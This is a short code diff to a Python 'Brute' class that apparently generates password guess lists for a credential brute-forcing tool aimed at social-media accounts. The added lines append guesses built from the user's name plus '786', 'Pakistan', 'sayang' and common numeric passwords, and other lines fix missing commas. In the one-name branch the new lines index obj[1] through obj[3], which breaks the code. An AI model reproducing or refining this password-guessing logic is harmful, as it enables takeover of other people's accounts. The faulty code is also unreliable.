@@ -94,7 +94,11 @@ class Brute:
 				if len(obj) == 1:
 					listpass = [
 						obj[0]+'123', obj[0]+'1234',
-						obj[0]+'12345',
+						obj[0]+'12345', obj[0]+'786',
+						obj[1]+'786', obj[2]+'786',
+						obj[3]+'786', 'Pakistan',
+						'pakistan', '123456789',
+						'123456', '786786',
 					]
 				elif len(obj) == 2:
 					listpass = [
@@ -117,10 +121,10 @@ class Brute:
 				else:
 					listpass = [
 						'sayang', 'Pakistan',
-						'pakistan', '786786'
+						'pakistan', '786786',
 						'sayang123', 'Pakistan',
-						'pakistan', '786786'
-						'Sayang', '123456789'
+						'pakistan', '786786',
+						'Sayang', '123456789',
 						'123456'
 					]
 				self.target.append({'id': user['uid'], 'pw': listpass})
